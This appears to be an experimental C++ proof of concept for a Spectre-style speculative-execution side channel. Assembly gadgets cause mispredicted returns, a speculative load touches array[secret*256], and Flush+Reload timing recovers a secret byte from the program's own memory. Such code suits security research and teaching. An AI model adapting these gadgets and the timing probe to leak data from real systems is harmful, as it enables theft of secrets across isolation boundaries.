#include "util.hpp"

using namespace std;

char array[256*256];
char temp;
char secret = 'p';

void gadget_flush(){
	__asm__(
	"pop %rdi;"
	"pop %rdi;"	
	"pop %rdi;"
	"nop;"
	"pop %rbp;"
	"clflush (%rsp);"
	"clflush (%rip);"
	"cpuid;"
	"retq;");
}

void gadget_nonflush(){
	__asm__(
	"pop %rdi;"
	"pop %rdi;"	
	"pop %rdi;"
	"nop;"
	"pop %rbp;"
	"clflush (%rsp);"
	"cpuid;"
	"retq;");
}


void speculative(char *secret_ptr){
	gadget_nonflush();
	secret = *secret_ptr;
	temp &= array[secret * 256];
}

void speculative_nonflush(char *secret_ptr){
	gadget_nonflush();
	secret = *secret_ptr;
	temp &= array[secret * 256];
}

void speculative_flush(char *secret_ptr){
	gadget_flush();
	secret = *secret_ptr;
	temp &= array[secret * 256];
}

int addFive(int x){
	return x+5;
}

inline void time(int i) {
	unsigned int dummy;
	auto t1 = __rdtscp(&dummy);
	auto junk = array[i*256];
	auto t2 = __rdtscp(&dummy);
	cout<< i <<" "<<t2-t1<<endl;
}

volatile void soo(){
	int i=5;
	return;
}

int main(){
	soo();
	int x = 2;
	int y = addFive(x);

	for (int i = 0; i < 256; i++){
		clflush(&array[i*256]);
	}

	unsigned int dummy;

	auto t1 = __rdtscp(&dummy);
	speculative_nonflush(&secret);
	auto t2 = __rdtscp(&dummy);
	cout<<t2-t1<<endl;


	auto t3 = __rdtscp(&dummy);
	speculative_flush(&secret);
	auto t4 = __rdtscp(&dummy);
	cout<<t4-t3<<endl;

	speculative(&secret);
	time(5);
	time(63);
	time(102);
	time(112);
	time(145);
	time(204);
	time(243);
	return 0;
}
